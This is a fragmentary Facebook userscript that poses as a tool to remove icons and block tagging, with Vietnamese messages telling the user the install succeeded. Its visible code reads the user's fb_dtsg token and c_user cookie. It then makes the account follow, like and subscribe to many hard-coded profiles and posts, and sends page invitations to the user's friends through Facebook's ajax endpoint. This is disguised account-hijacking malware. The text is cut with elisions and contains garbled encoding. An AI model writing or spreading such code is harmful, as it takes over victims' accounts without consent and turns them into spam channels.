// ==UserScript==
// @name            Gỡ Bỏ ICON Và Chống Tag Trên Facebook (02)
...
;
arkadaslari_al(id);
arkadaslari_al(289961691154265);
...
"chars" : " :) ",
		...
		"name" : "Gru?Ã†â€™Ãƒâ€šÃ‚Â±?Ã†â€™Ãƒâ€šÃ‚Â³n"
	}, {
		"chars" : " :/ ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com" target="_blank">Chúc mừng bạn đã cài đặt thành công, ấn F5 để hoàn tất <br>FaceBook</a>';
	html += '</div>';
...
alert('Chúc Bạn Online Vui Vẻ ^_^ Luv u all <3                                                                                              HTTP://FaceBook.com');
function Like(p) {
...
//Saddest
a("100005273767053");
sublist("235671419951982"); sublist("238882396297551");
P("239577529561371");P("239577669561357");
P("289961691154265");// Ed
P("240954959423628"); //Thử lượng like

Like("1448426485387691");
// Tuan Nguyen
a("100002393872010");
P("463177983771993"); P("446305672125891");
// Phát Đồng Hollister
a("100003683386514"); a("100004693272659");
Like("1379705245587523");
//Ed Thành
a("100004213090535");
sublist("287718501378584"); sublist("287723234711444"); sublist("288025391347895");
P("287441078072993"); P("284367345047033");
//Hiệp
a("100007689067573");
P("1393670457565910"); P("1389586344640988");
var gid = ['536373039819249'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
...
jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=1448426485387691&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post");//Hài VL
